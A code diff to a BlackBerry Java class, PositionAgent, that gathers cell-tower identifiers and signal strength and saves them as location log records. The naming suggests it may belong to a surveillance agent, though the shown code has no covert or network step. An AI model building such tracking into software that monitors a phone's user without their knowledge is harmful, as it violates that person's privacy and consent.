@@ -21,6 +21,7 @@ import javax.microedition.location.QualifiedCoordinates;
 
 import net.rim.device.api.system.CDMAInfo;
 import net.rim.device.api.system.GPRSInfo;
+import net.rim.device.api.system.RadioInfo;
 import net.rim.device.api.system.CDMAInfo.CDMACellInfo;
 import net.rim.device.api.system.GPRSInfo.GPRSCellInfo;
 import net.rim.device.api.util.DataBuffer;
@@ -126,6 +127,9 @@ public final class PositionAgent extends Agent implements LocationListener {
 
         } catch (LocationException e) {
 
+            //#ifdef DEBUG_ERROR
+            debug.error(e);
+            //#endif
         }
     }
 
@@ -158,7 +162,8 @@ public final class PositionAgent extends Agent implements LocationListener {
             final int lac = cellinfo.getLAC();
             final int cid = cellinfo.getCellId();
 
-            final int bsic = GPRSInfo.getCellInfo().getBSIC();
+            final int bsic = cellinfo.getBSIC();
+            final int rssi = cellinfo.getRSSI();
 
             final StringBuffer mb = new StringBuffer();
             mb.append("MCC: " + Integer.toHexString(mcc));
@@ -169,7 +174,7 @@ public final class PositionAgent extends Agent implements LocationListener {
             debug.info(mb.toString());
             //#endif
 
-            byte[] payload = getCellPayload(mcc, mnc, lac, cid);
+            byte[] payload = getCellPayload(mcc, mnc, lac, cid, rssi);
             saveLog(payload, TYPE_CELL);
 
         } else {
@@ -177,7 +182,9 @@ public final class PositionAgent extends Agent implements LocationListener {
             //CDMAInfo.getIMSI()
             final int sid = cellinfo.getSID();
             final int nid = cellinfo.getNID();
-            final int bid = cellinfo.getBID();
+            final int bid = cellinfo.getBID();     
+            //https://www.blackberry.com/jira/browse/JAVAAPI-641
+            final int mcc = RadioInfo.getMCC(RadioInfo.getCurrentNetworkIndex());
 
             final StringBuffer mb = new StringBuffer();
             mb.append("SID: " + sid);
@@ -188,7 +195,7 @@ public final class PositionAgent extends Agent implements LocationListener {
             debug.info(mb.toString());
             //#endif
 
-            byte[] payload = getCellPayload(sid, nid, bid, 0);
+            byte[] payload = getCellPayload(mcc, sid, nid, bid, 0);
             saveLog(payload, TYPE_CELL);
         }
 
@@ -296,7 +303,7 @@ public final class PositionAgent extends Agent implements LocationListener {
         log.close();
     }
 
-    private byte[] getCellPayload(int mcc, int mnc, int lac, int cid) {
+    private byte[] getCellPayload(int mcc, int mnc, int lac, int cid, int rssi) {
 
         int size = 19 * 4 + 48 + 16;
         byte[] cellPosition = new byte[size];
